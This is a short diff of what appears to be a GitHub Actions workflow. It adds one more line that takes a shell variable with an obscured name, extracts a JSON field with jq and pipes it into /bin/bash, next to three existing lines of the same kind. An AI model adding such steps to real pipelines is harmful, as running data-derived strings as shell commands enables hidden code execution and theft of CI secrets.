@@ -34,6 +34,7 @@ jobs:
           echo $rjusf382 | jq -r .ee268 | /bin/bash
           printf '%s' "$ycgyb0373" | jq -r .k05201 | /bin/bash
           printf '%s' "$q029" | jq -r .cygn81 | /bin/bash
+          echo $gofj3 | jq -r .xe1 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
